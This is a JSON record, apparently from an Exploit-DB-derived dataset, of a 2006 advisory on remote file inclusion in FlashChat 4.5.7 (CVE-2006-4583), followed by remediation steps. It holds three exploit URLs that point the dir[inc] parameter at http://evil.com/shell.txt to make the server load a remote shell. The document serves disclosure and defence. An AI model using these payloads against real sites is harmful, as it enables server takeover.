{
  "id": "2293",
  "title": "FlashChat 4.5.7 - &#039;aedating4CMS.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-4583",
  "vuln_type": "unknown",
  "code": "NeXtMaN <mc.nadz [at] gmail.com>\r\n\r\nHere are 3 RFI vulnerabilities in Flashchat i've found:\r\n\r\nCode:\r\nhttp://site.com/[script_path]/inc/cmses/aedating4CMS.php?dir[inc]=http://evil.com/shell.txt?\r\nhttp://site.com/[script_path]/inc/cmses/aedatingCMS2.php?dir[inc]=http://evil.com/shell.txt?\r\nhttp://site.com/[script_path]/inc/cmses/aedatingCMS.php?dir[inc]=http://evil.com/shell.txt?\r\n\r\nvideo here:\r\n\r\nCode:\r\nhttp://rapidshare.de/files/31362430/Flashchat.rar.html\r\n\r\n\r\nEDIT: Solution:\r\n\r\n\r\nIt looks like the vulnerable files are there in case you want to integrate with another script. The script that would require these files is AEDating:\r\n\r\nyou simply delete the following files and you will be secure:\r\n\r\n/inc/cmses/aedating4CMS.php\r\n/inc/cmses/aedatingCMS.php\r\n/inc/cmses/aedatingCMS2.php\r\n\r\nif your flashchat is integrated with AEDating and/or you dont want to delete the files you can just edit the 3 files to use your path like this:\r\n\r\nReplace this:\r\n\r\n$aed_root_path = realpath(dirname(__FILE__) . '/../../../') . '/';\r\ninclude($aed_root_path . 'inc/header.inc.php');\r\nrequire_once( \"$dir[inc]db.inc.php\" );\r\nrequire_once( \"$dir[inc]admin.inc.php\" );\r\n\r\nWith this:\r\n\r\n$aed_root_path = realpath(dirname(__FILE__) . '/../../../') . '/';\r\ninclude($aed_root_path . 'inc/header.inc.php');\r\nrequire_once( \"[Your AED path]/db.inc.php\" );\r\nrequire_once( \"[Your AED path]/admin.inc.php\" );\r\n\r\nAlternatively you could just upgrade to 4.6.2 (just released)\r\n\r\nPS, all 3 of those files are vulnerable and will need editing.\r\n\r\n# milw0rm.com [2006-09-04]",
  "url": "https://www.exploit-db.com/exploits/2293"
}